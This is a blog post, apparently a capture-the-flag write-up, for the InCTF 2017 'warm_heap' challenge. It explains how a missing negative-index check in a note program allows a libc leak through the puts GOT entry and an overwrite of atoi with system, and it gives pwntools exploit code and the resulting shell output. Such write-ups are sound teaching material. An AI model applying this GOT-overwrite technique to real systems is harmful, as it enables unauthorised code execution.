@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>InCTF 2017 - warm_heap | kileak</title>
+
+
+
+
+
+<meta name="description" content="InCTF 2017 - warm_heap">
+
+
+<meta name="keywords" content="inctf">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2017/inCTF-warm_heap/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">InCTF 2017 - warm_heap</h1>
+      <p class="post-meta">Dec 17, 2017</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>warm_heap
+<!--break--></p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/warm_heap/warm_heap">warm_heap</a> <a href="https://kileak.github.io/assets/warm_heap/libc.so.6">libc.so.6</a> <a href="https://kileak.github.io/assets/warm_heap/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">---------------------------
+1) Add note
+2) Edit note
+3) Remove note
+4) View note
+5) Exit
+&gt;&gt; </code></pre></figure>
+
+<p>Just added this writeup to show an unintended solution for this challenge. At least the flag, you’ll get for solving the challenge points to using UAF for it, but there’s another (much shorter) way to do this.</p>
+
+<p>When a note gets added, you can specify the size for the note, which will be stored in its own array.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">---------------------------
+1) Add note
+2) Edit note
+3) Remove note
+4) View note
+5) Exit
+&gt;&gt; 1
+Enter index: 0
+Enter size: 100
+Enter input: AAAA
+1) Add note
+2) Edit note
+3) Remove note
+4) View note
+5) Exit
+&gt;&gt; 1
+Enter index: 3
+Enter size: 200
+Enter input: BBBB</code></pre></figure>
+
+<p>This will resulting in the following data in the <code class="language-plaintext highlighter-rouge">bss</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x6020c0 &lt;sizes&gt;:     0x0000000000000064  0x0000000000000000 &lt;== Size of 0
+0x6020d0 &lt;sizes+16&gt;:  0x0000000000000000  0x00000000000000c8 &lt;== Size of 3
+0x6020e0 &lt;sizes+32&gt;:  0x0000000000000000  0x0000000000000000
+0x6020f0 &lt;sizes+48&gt;:  0x0000000000000000  0x0000000000000000
+0x602100 &lt;sizes+64&gt;:  0x0000000000000000  0x0000000000000000
+0x602110:             0x0000000000000000  0x0000000000000000
+0x602120 &lt;table&gt;:     0x0000000000acd010  0x0000000000000000 &lt;== ptr to 0
+0x602130 &lt;table+16&gt;:  0x0000000000000000  0x0000000000acd080 &lt;== ptr to 3
+0x602140 &lt;table+32&gt;:  0x0000000000000000  0x0000000000000000
+0x602150 &lt;table+48&gt;:  0x0000000000000000  0x0000000000000000
+0x602160 &lt;table+64&gt;:  0x0000000000000000  0x0000000000000000</code></pre></figure>
+
+<p>Now, let’s take a look at the <code class="language-plaintext highlighter-rouge">edit</code> function:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">edit</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Enter index: "</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="n">get_int</span><span class="p">();</span>
+  
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">verify</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Enter input: "</span><span class="p">);</span>
+  <span class="n">get_inp</span><span class="p">(</span><span class="n">table</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span> <span class="n">sizes</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">verify</span><span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span> <span class="n">idx</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&lt;=</span> <span class="mi">9</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid index"</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>If you paid attention, you’ll might see, that the <code class="language-plaintext highlighter-rouge">verify</code> function doesn’t check for negative indices. So we can access <code class="language-plaintext highlighter-rouge">table</code> entries before the table entry itself.</p>
+
+<p>Also we can specify arbitrary values for the sizes of an entry, so why not just create an entry with a size of <code class="language-plaintext highlighter-rouge">0x602020</code> (you see where we’re going?).</p>
+
+<p>We can adjust the sizes of an entry, so that it results in an address of a <code class="language-plaintext highlighter-rouge">got</code> entry. Then we’ll specify a negative value, so the size is used as a note address. Since the binary also uses the negative <code class="language-plaintext highlighter-rouge">index</code> on the size array, it will also look before the size array (where the got table happens to be :)) and use an address (better said, the lower dword of the address) from the <code class="language-plaintext highlighter-rouge">got</code> table as the <code class="language-plaintext highlighter-rouge">size</code> for our memo.</p>
+
+<p>Let’s do the basic skeleton and create two notes, with sizes <code class="language-plaintext highlighter-rouge">0x602020</code> and <code class="language-plaintext highlighter-rouge">0x602050</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"35.227.33.93"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"size: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"input: "</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"input: "</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Fill size array for leaking libc address"</span><span class="p">)</span>
+
+    <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x602020</span><span class="p">,</span> <span class="s">"AAAA"</span><span class="p">)</span>   <span class="c1"># for libc leak
+</span>    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x602068</span><span class="p">,</span> <span class="s">"AAAA"</span><span class="p">)</span>   <span class="c1"># for atoi overwrite
+</span>    
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    
+    <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./warm_heap"</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>       
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./warm_heap"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="s">"./libc.so.6"</span><span class="p">})</span>
+        <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>This will change the data in the bss to</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x602000: 0x0000000000601e28  0x00007fd9265b5168 &lt;== got table
+0x602010: 0x00007fd9263a5870  0x0000000000400696 
+0x602020: 0x00007fd926033690  0x00000000004006b6
+0x602030: 0x00007fd926019800  0x00000000004006d6
+0x602040: 0x00007fd9260bb220  0x00007fd925fe4740
+0x602050: 0x00007fd925ffaeb0  0x00007fd926048130
+0x602060: 0x00007fd926033e70  0x00007fd925ffae80
+0x602070: 0x0000000000400746  0x0000000000000000
+0x602080: 0x0000000000000000  0x0000000000000000
+0x602090: 0x0000000000000000  0x0000000000000000
+0x6020a0: 0x00007fd926389620  0x0000000000000000
+0x6020b0: 0x0000000000000000  0x0000000000000000
+0x6020c0 &lt;sizes&gt;:     0x0000000000602020  0x0000000000000000 &lt;== size of note 0 (=&gt; puts got)
+0x6020d0 &lt;sizes+16&gt;:  0x0000000000602050  0x0000000000000000 &lt;== size of note 1 (=&gt; atoll got)
+0x6020e0 &lt;sizes+32&gt;:  0x0000000000000000  0x0000000000000000
+0x6020f0 &lt;sizes+48&gt;:  0x0000000000000000  0x0000000000000000
+0x602100 &lt;sizes+64&gt;:  0x0000000000000000  0x0000000000000000
+0x602110: 0x0000000000000000  0x0000000000000000
+0x602120 &lt;table&gt;:     0x00007fd9259c1010  0x0000000000000000
+0x602130 &lt;table+16&gt;:  0x00007fd9253be010  0x0000000000000000
+0x602140 &lt;table+32&gt;:  0x0000000000000000  0x0000000000000000
+0x602150 &lt;table+48&gt;:  0x0000000000000000  0x0000000000000000
+0x602160 &lt;table+64&gt;:  0x0000000000000000  0x0000000000000000</code></pre></figure>
+
+<p>So, now we have two valid and known addresses in the bss (though in the <code class="language-plaintext highlighter-rouge">sizes</code> array).</p>
+
+<p>Now, since we can specify negative indices, we can access the “note” in the first <code class="language-plaintext highlighter-rouge">sizes</code> entry by passing <code class="language-plaintext highlighter-rouge">-12</code> as the note index. The binary will then try to print the note at that address, which happens to be the <code class="language-plaintext highlighter-rouge">got</code> entry for <code class="language-plaintext highlighter-rouge">puts</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="o">-</span><span class="mi">12</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC           : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<p>Since we now have successfully resolved libc, we can just use the same functionality to overwrite values in the <code class="language-plaintext highlighter-rouge">got</code> entry. We just have to make sure, that it hits a good value as <code class="language-plaintext highlighter-rouge">size</code> for our <code class="language-plaintext highlighter-rouge">size</code> entry ?-)</p>
+
+<p>The binary will search for the size at offset <code class="language-plaintext highlighter-rouge">-0x60</code> to the current size slot.</p>
+
+<p>That’s the reason, I put the second address into the third slot of the <code class="language-plaintext highlighter-rouge">size</code> array. This will make it use the content of <code class="language-plaintext highlighter-rouge">0x602070</code> as size for <code class="language-plaintext highlighter-rouge">read</code>. At <code class="language-plaintext highlighter-rouge">0x602070</code> is <code class="language-plaintext highlighter-rouge">exit</code> got, which isn’t resolved by now, so it will always be <code class="language-plaintext highlighter-rouge">0x400746</code> and thus the read will succeed.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite atoi got with system"</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="o">-</span><span class="mi">10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])[:</span><span class="mi">6</span><span class="p">])</span></code></pre></figure>
+
+<p>Really? UAF? Instead of just overwriting <code class="language-plaintext highlighter-rouge">atoi</code> got directly? :D</p>
+
+<p>So, <code class="language-plaintext highlighter-rouge">atoi</code> will be called to convert the selected menu entry to a number, so we just have to select the option <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Select /bin/sh to trigger shell"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/vagrant/Challenges/inctf/pwn/warm_heap/warm_heap'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/vagrant/Challenges/inctf/pwn/warm_heap/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process './warm_heap': pid 1803
+[1803]
+[*] Paused (press any to continue)
+[*] Fill size array for leaking libc address
+[*] LIBC leak      : 0x7fe97e452690
+[*] LIBC           : 0x7fe97e3e3000
+[*] Fill size array for overwrite got entry
+[*] Add chunk with size /bin/sh to trigger shell
+[*] Switching to interactive mode
+$ whoami
+vagrant</code></pre></figure>
+
+<p>Flag was <code class="language-plaintext highlighter-rouge">inctf{U4f_f0r_l1f3_m8}</code> (the flag was a little confusing after this)</p>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=InCTF 2017 - warm_heap&amp;url=https://kileak.github.io/ctf/2017/inCTF-warm_heap/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2017/inCTF-warm_heap/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2017/inCTF-warm_heap';
+        var disqus_title = 'InCTF 2017 - warm_heap';
+        var disqus_url = 'https://kileak.github.io/ctf/2017/inCTF-warm_heap';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
